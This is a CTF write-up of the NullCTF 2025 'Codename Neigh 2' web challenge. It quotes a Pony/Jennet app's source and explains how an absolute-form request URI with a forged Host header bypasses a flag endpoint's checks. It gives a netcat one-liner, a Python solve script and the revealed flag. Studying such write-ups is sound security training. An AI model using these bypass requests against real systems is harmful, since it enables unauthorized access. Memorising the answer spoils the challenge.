# NullCTF 2025 - Codename Neigh 2 Challenge Writeup

**Author:** xseven  
**Category:** Web  
**Difficulty:** Easy  

**Description:**
> Beyond the familiar chronometers lies the Temporal Nexus, where a desperate plea for the lost Neigh echoes through history. If the last trial felt light, prepare for forbidden archives, paradoxes, and enigmas that span epochs.
>
> http://public.ctf.r0devnull.team:3003

---

## Intro

Codename Neigh 2 is a web exploitation challenge featuring a custom web application written in **Pony** programming language using the **Jennet** web framework. The application presents a "Temporal Nexus" themed website where users can report sightings of a missing pony named "Neigh". 

The challenge requires exploiting a subtle vulnerability in HTTP request handling to access a protected flag endpoint. The application implements access control checks based on the `Host` header and request path validation, but these checks can be bypassed through HTTP request smuggling techniques using absolute URIs in the HTTP request line.

This challenge tests understanding of:
- HTTP protocol specifications and edge cases
- Web framework request parsing behavior
- Path traversal and validation bypass techniques
- Host header manipulation

---

## Initial Analysis

### Challenge Files Structure

The challenge provides the following files:

```
docker-compose.yml
Dockerfile
app/
    main.pony
    private/
        flag.html
    public/
        error.html
        index.html
        pony.html
        report.html
        style.css
```

### Dockerfile Analysis

```dockerfile
FROM ghcr.io/ponylang/ponyc:alpine

RUN apk update && \
    apk add --no-cache curl bash libressl-dev

WORKDIR /app

RUN corral init && \
    corral add github.com/theodus/jennet.git && \
    corral fetch

COPY ./app /app

RUN corral run -- ponyc -Dopenssl_0.9.0 -d -b main

CMD ["/app/main"]
```

The application uses:
- Pony programming language
- Jennet web framework (a lightweight HTTP server library for Pony)
- Alpine Linux base image
- Listens on port 9082

### Docker Compose Configuration

```yaml
name: codename-neigh-2
services:
  neigh2:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "9082:9082"
```

The service exposes port 9082 for external access.

---

## Source Code Analysis

### Main Application Logic (`app/main.pony`)

The core application code reveals several interesting endpoints and security mechanisms:

```pony
use "net"
use "files"
use "jennet"
use "http_server"
use "collections"



actor Main
  new create(env: Env) =>
    let tcplauth: TCPListenAuth = TCPListenAuth(env.root)
    let fileauth: FileAuth = FileAuth(env.root)

    let server =
      Jennet(tcplauth, env.out)
        .> serve_file(fileauth, "/", "public/index.html")
        .> serve_file(fileauth, "/pony", "public/pony.html")
        .> post("/pony/find", PonyFind(fileauth))
        .> get("/flag", F(fileauth))
        .> get("/:name", H(fileauth))
        .serve(ServerConfig(
          where host' = "0.0.0.0",
                port' = "9082",
                max_concurrent_connections' = 10000
        ))

    if server is None then
      env.out.print("bad routes!")
    end



class F is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun not_starts_with(s: String, prefix: String): Bool =>
    (s.size() >= prefix.size()) and (s.substring(0, prefix.size().isize()) != prefix)

  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()
    
    try
      conn = ctx.request.header("Host") as String
    end
    
    let path: String = ctx.request.uri().string()
    //body = ("[REDACTED] Path:" + path).array()

    if (conn == "127.0.0.1") and not_starts_with(path, "flag") and not_starts_with(path, "/flag") then
      let fpath = FilePath(_fileauth, "private/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx



class H is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    try
      let name = URLEncode.decode(ctx.param("name"))?
      let body = "".join(
        [ "Not found"; if name != "" then " " + name else "" end; "!"
        ].values()).array()
      ctx.respond(
        StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
        body
      )
    else
      let body = "Error".array()
      ctx.respond(
        StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
        body
      )
    end
    consume ctx



class PonyFind is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    let body' = ctx.body
    let form_data = recover val FormData.parse(body'.string()) end
    
    var html: String = ""
    if form_data.is_valid() then
      let path = FilePath(_fileauth, "public/report.html")
      with file = File(path) do
        var content: String ref = file.read_string(file.size()).string()
        form_data._inject_form_data(content)
        html = content.string()
      end
    else
      let path = FilePath(_fileauth, "public/error.html")
      with file = File(path) do
        html = file.read_string(file.size()).string()
      end
    end

    let html_arr = html.array()
    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", html_arr.size().string())]),
      html_arr
    )
    consume ctx



class FormData
  let data: Map[String, String] = Map[String, String]
  
  new val parse(body: String) =>
    for pair in body.split_by("&").values() do
      let kv = pair.split_by("=")
      if kv.size() == 2 then
        try
          data(kv(0)?) = kv(1)?
        end
      end
    end
  
  fun is_valid(): Bool =>
    data.contains("reporterName") and
    data.contains("sightingLocation") and
    data.contains("contactMethod") and
    data.contains("message")
  
  fun get_or_else(key: String, default: String = ""): String =>
    try data(key)? else default end
  
  fun apply(key: String): String =>
    try data(key)? else "" end

  fun extract_template_vars(s: String ref): Array[String] ref^ =>
    let vars: Array[String] ref = recover Array[String] end
    var pos: ISize = 0
    
    try
      let len = s.size().isize()

      while pos < len do
        let start = s.find("{{", pos)?
        let end_pos = s.find("}}", start + 2)?

        var var_name = s.substring(start + 2, end_pos).clone()
        if var_name isnt None then
          var_name.strip()
          if var_name.size() > 0 then
            vars.push(consume var_name)
          end
        end
        
        pos = end_pos + 2
      end
    end
    
    consume vars

  fun _inject_form_data(html: String ref) =>
    let vars = extract_template_vars(html)
    for name in vars.values() do
      if data.contains(name) then
        html.replace("{{" + name + "}}", try data(name)? else "{{" + name + "}}" end)
      end
    end

```

The application defines several routes:
- `GET /` - Serves the main index page
- `GET /pony` - Serves the missing pony report page
- `POST /pony/find` - Handles pony sighting form submissions
- `GET /flag` - **Protected endpoint that serves the flag**
- `GET /:name` - Wildcard route for handling arbitrary paths

### The Flag Endpoint Handler

The most critical component is the `F` class that handles the `/flag` endpoint:

```pony
class F is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun not_starts_with(s: String, prefix: String): Bool =>
    (s.size() >= prefix.size()) and (s.substring(0, prefix.size().isize()) != prefix)

  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()
    
    try
      conn = ctx.request.header("Host") as String
    end
    
    let path: String = ctx.request.uri().string()
    //body = ("[REDACTED] Path:" + path).array()

    if (conn == "127.0.0.1") and not_starts_with(path, "flag") and not_starts_with(path, "/flag") then
      let fpath = FilePath(_fileauth, "private/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx
```

### Security Check Analysis

The flag endpoint implements two security checks before serving `private/flag.html`:

1. **Host Header Check:** `conn == "127.0.0.1"`
   - The `Host` header must be exactly `127.0.0.1`
   
2. **Path Validation:** `not_starts_with(path, "flag") and not_starts_with(path, "/flag")`
   - The URI path must NOT start with "flag" or "/flag"

At first glance, this seems contradictory: the route is defined as `/flag`, but the handler rejects requests where the path starts with `/flag`. This is the core vulnerability.

---

## Vulnerability Analysis

### The Discrepancy: Routing vs. Validation

The vulnerability lies in how the Jennet framework parses and routes requests versus how the application validates the path:

1. **Routing Phase:** Jennet parses the HTTP request and extracts the path component from the request line to match against defined routes (`/flag`)

2. **Validation Phase:** The application calls `ctx.request.uri().string()` to get the full URI for validation

### HTTP Request Format

According to RFC 7230, HTTP/1.1 requests can use two formats for the request-target:

**Origin Form (Standard):**
```http
GET /flag HTTP/1.1
Host: example.com
```

**Absolute Form (Proxy):**
```http
GET http://example.com/flag HTTP/1.1
Host: example.com
```

The absolute form was originally designed for proxy servers but is valid HTTP/1.1 syntax.

### The Bypass Mechanism

When we send a request using the absolute URI format:

```http
GET http://127.0.0.1/flag HTTP/1.1
Host: 127.0.0.1
```

**What happens:**

1. **Jennet's Router:** Extracts the path component (`/flag`) from the absolute URI and correctly routes the request to the `F` handler

2. **`ctx.request.uri().string()`:** Returns the **full absolute URI** (`http://127.0.0.1/flag`) instead of just the path

3. **Path Validation:**
   - Check: `not_starts_with("http://127.0.0.1/flag", "flag")` → **TRUE** ✓
   - Check: `not_starts_with("http://127.0.0.1/flag", "/flag")` → **TRUE** ✓
   - The string `http://127.0.0.1/flag` starts with `http`, not `/flag`, so it passes validation!

4. **Host Header Check:** `Host: 127.0.0.1` satisfies the first condition ✓

Both security checks pass, and the flag file is served.

### Root Cause

The vulnerability exists because:
- The framework uses the parsed path component for routing
- The application uses the full URI string for validation
- The validation logic assumes the URI will be in origin form (just the path)
- No normalization occurs between routing and validation

---

## Exploitation

### Testing the Application

First, let's verify the application is accessible and explore its functionality:

```bash
$ curl http://public.ctf.r0devnull.team:3003/
```

The home page loads successfully, showing the "Temporal Nexus" interface with various sections including the missing pony alert.

### Accessing the Pony Report Page

```bash
$ curl http://public.ctf.r0devnull.team:3003/pony
```

This page displays a form for reporting sightings of the missing pony "Neigh", which accepts fields for reporter name, location, contact method, and a message.

### Attempting Direct Flag Access

A naive attempt to access the flag endpoint fails:

```bash
$ curl -v http://public.ctf.r0devnull.team:3003/flag
```

**Response:**
```
HTTP/1.1 200 OK
Content-Length: 16

[REDACTED]
```

This returns only `[REDACTED]` because:
- The `Host` header is `public.ctf.r0devnull.team:3003`, not `127.0.0.1`
- Even if we add the correct Host header, the path starts with `/flag`

### Testing Host Header Manipulation

```bash
$ curl -H "Host: 127.0.0.1" http://public.ctf.r0devnull.team:3003/flag
```

Still returns `[REDACTED]` because the path check `not_starts_with(path, "/flag")` fails.

### The Successful Exploit: Absolute URI

Using `netcat` to craft a raw HTTP request with an absolute URI:

```bash
$ printf "GET http://127.0.0.1/flag HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | nc public.ctf.r0devnull.team 3003
```

**Response:**
```http
HTTP/1.1 200 OK
Connection: close
Content-Length: 175

<!DOCTYPE html>
<html lang="en">
<body>
    No pony here but you did find the flag:
    <br>
    <b>nullctf{n0w_w!th_99%_l3ss_un1nt3nd3d_s0lv3s_m4yb3!!!@}</b>
</body>
</html>
```

**Success!** The flag is revealed.

---

## Solution Script

For automated exploitation, here's a Python script that performs the exploit:

### `solve.py`

```python
import socket

host = "public.ctf.r0devnull.team"
port = 3003

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

request = b"GET http://127.0.0.1/flag HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
s.sendall(request)

response = b""
while True:
    data = s.recv(4096)
    if not data:
        break
    response += data

print(response.decode())
s.close()
```

### Execution

```bash
$ python3 solve.py
```

**Output:**
```
HTTP/1.1 200 OK
Connection: close
Content-Length: 175

<!DOCTYPE html>
<html lang="en">
<body>
    No pony here but you did find the flag:
    <br>
    <b>nullctf{n0w_w!th_99%_l3ss_un1nt3nd3d_s0lv3s_m4yb3!!!@}</b>
</body>
</html>
```

---

## Key Takeaways

### For Defenders

1. **Consistent Path Handling:** Always use the same normalized representation of the request path throughout your application. Don't mix raw URIs with parsed path components.

2. **Framework Awareness:** Understand how your web framework parses and exposes HTTP request components. Different methods might return different representations.

3. **Proper Validation:** If implementing path-based access controls:
   - Extract the path component consistently
   - Normalize paths (remove `..`, resolve symbolic links)
   - Use allowlists instead of denylists when possible
   - Test with various HTTP request formats (origin-form, absolute-form, etc.)

4. **Defense in Depth:** Don't rely on a single validation mechanism. Combine multiple security layers:
   - Network-level restrictions (firewall rules)
   - Application-level authentication and authorization
   - Proper file system permissions

### For Attackers/Pentesters

1. **HTTP Specification Knowledge:** Deep understanding of HTTP RFCs reveals edge cases that frameworks may handle inconsistently.

2. **Request Format Variations:** Always test different valid HTTP request formats:
   - Standard origin-form requests
   - Absolute URIs
   - Path encoding variations (`/flag` vs `/%2fflag`)
   - Double slashes (`//flag`)
   - Case sensitivity variations

3. **Framework Behavior:** Research how specific frameworks parse and expose request data. Documentation often doesn't cover edge cases.

4. **Inconsistency Detection:** Look for discrepancies between:
   - Routing logic and validation logic
   - Different methods of accessing the same request property
   - Client-side and server-side path handling

---

## Conclusion

This challenge demonstrates that even simple validation logic can be bypassed when there's a mismatch between how a framework routes requests and how the application validates them. The vulnerability is subtle and requires understanding both HTTP protocol specifics and framework internals.

The challenge name and flag hint at the issue: "99% less unintended solves" suggests the author fixed previous bypass methods but left this one intentionally (or unintentionally) exploitable. It's a reminder that security by obscurity and denylisting approaches often fail against determined attackers who understand the underlying protocols and systems.

The use of an unconventional programming language (Pony) and framework (Jennet) adds an extra layer of difficulty, as there's less public documentation and fewer known vulnerabilities compared to mainstream frameworks. However, the fundamental principles of HTTP request handling remain the same across all implementations.

Pwned!

KOREONE
